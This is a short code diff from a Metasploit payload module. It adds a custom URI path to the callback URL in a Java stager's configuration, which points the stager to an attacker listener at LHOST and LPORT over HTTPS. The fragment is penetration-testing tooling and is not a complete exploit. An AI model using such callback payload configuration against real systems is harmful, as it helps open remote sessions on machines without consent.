@@ -57,6 +57,7 @@ module MetasploitModule
     c << "Spawn=#{spawn}\n"
     c << "URL=https://#{datastore["LHOST"]}"
     c << ":#{datastore["LPORT"]}" if datastore["LPORT"]
+    c << "#{luri}"
     c << generate_uri_uuid_mode(:init_java, uri_req_len)
     c << "\n"
 
